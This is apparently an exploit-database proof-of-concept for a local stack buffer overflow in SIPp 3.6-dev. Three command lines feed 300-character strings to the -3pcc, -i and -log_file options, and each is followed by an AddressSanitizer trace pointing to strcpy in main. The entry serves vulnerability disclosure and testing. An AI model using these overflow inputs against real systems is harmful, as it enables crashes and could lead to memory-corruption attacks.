Exploit Title: SIPp 3.6 - Local Buffer Overflow (PoC)<br>
Date: 2018-06-30<br>
Exploit Author: Fakhri Zulkifli<br>
Vendor Homepage: http://sipp.sourceforge.net/<br>
Software Link: https://github.com/SIPp/sipp/releases<br>
Version: 3.6-dev and earlier<br>
Tested on: 3.6-dev<br>
<br>
$ ./sipp -3pcc `python -c ‘print “A” * 300'`<br>
<br>
#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425<br>
#1 0x668d06 in main /home/user/sipp/src/sipp.cpp:1531:17<br>
#2 0x7ff5ec21282f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291<br>
#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)<br>
<br>
$ ./sipp -i `python -c ‘print “A” * 300'`<br>
<br>
#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425<br>
#1 0x66a303 in main /home/user/sipp/src/sipp.cpp:1477:17<br>
#2 0x7f281302682f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291<br>
#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)<br>
<br>
$ ./sipp -log_file `python -c ‘print “A” * 300'`<br>
<br>
#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425<br>
#1 0x66912f in main /home/user/sipp/src/sipp.cpp:1706:17<br>
#2 0x7f6ca663782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291<br>
#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)<br>